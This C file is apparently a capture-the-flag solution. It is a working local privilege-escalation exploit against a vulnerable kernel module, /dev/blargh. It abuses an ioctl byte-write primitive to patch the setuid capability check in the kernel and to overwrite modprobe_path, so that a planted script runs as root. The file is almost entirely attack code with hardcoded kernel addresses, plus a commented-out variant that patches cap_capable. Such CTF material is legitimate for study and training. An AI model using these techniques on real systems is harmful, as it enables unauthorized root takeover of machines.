#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <err.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <stdarg.h>

// commands
#define DEV_PATH "/dev/blargh"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(char* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static void shell_modprobe_setup() {
    system("echo '#!/bin/sh\nchmod 777 /flag.txt' > /s");
    system("chmod 777 /s");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

int64_t user_cs, user_ss, user_rflags, user_sp;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

void info(const char *format, ...) {
    va_list args;
    va_start(args, format);

    printf("[+] ");
    vprintf(format, args);

    va_end(args);
}

#define PAGE_COUNT 128
#define PAGE_SIZE 4096
int pipes[0x10][0x02];

void alloc_pipe_buf(int i)
{
    if (pipe(pipes[i]) < 0) {
        perror("[X] alloc_pipe_buff()");
        return;
    }
}

void do_write(int fd, size_t off) {
    int ret = ioctl(fd, 0x40086721, off);
    if (ret < 0) {
        errExit("ioctl");
    }
}

/*
    // supervisor code can write to read-only pages
    0xffffffffc0000026:  mov    rax,cr0
    0xffffffffc0000029:  xor    rax,0x10000
    0xffffffffc000002f:  mov    cr0,rax
    0xffffffffc0000032:  mov    BYTE PTR [rdx-0x7ecfcda0],0x0
    0xffffffffc0000039:  mov    rax,cr0
    0xffffffffc000003c:  xor    rax,0x10000
    0xffffffffc0000042:  mov    cr0,rax
*/

// umode_t = short

// 0x7ecfcda0
static uint64_t write_off = 0x7ecfcda0;

void overwrite_setuid(int fd) {
    // change the jump after ns_capable_setid in sys_setuid to always succeed
    // (jumps to the next instr)
    uint64_t sys_setuid = 0xffffffff812a86a9+write_off+1;
    do_write(fd, sys_setuid);
    int ret = setuid(0);
    if (ret < 0) {
        errExit("Didn't work\n");
    }
    system("cat /flag.txt");
}

typedef struct {
    uint16_t salg_family;
    uint8_t salg_type[14];
    uint32_t salg_feat;
    uint32_t salg_mask;
    uint8_t salg_name[64];
} sockaddr_alg_t;

void new_modprobe(int fd) {
    shell_modprobe_setup();

    sockaddr_alg_t sa;

    // change modprobe path to /s
    uint64_t modprobe = 0xffffffff82b45b20;
    do_write(fd, modprobe+ write_off +2);

    // request_module will also be called if socket call fails
    int alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (alg_fd < 0) {
        puts("socket(AF_ALG) failed");
    }

    system("cat /flag.txt");
}

int main(void) {
    int ret;
    int fd = open(DEV_PATH, O_RDONLY);

    if (fd < 0) {
        errExit("Failed to open dev file\n");
    }

    // is subtracted from the address we pass

    // get infinite zero byte writes by changing write to
    // mov    eax,DWORD PTR [rip+0x6] so it always writes bytes != 0 to eax,
    // causing the jump to not be taken
    //uint64_t module_base = 0xffffffffc0000000;
    //do_write(fd, module_base+ write_off +0x1c+3);

    //uint64_t cap_capable = 0xffffffff816a4457 +1+ write_off;
    //do_write(fd, cap_capable);

    //overwrite_setuid(fd);

    new_modprobe(fd);

    puts("Done");


    WAIT();
}

// my solve overwrote a byte in cap_capable rendering capability checks useless

// .;,;.{bl4a4a444aaa4a4a44a4a4a44a4a4a4rgh}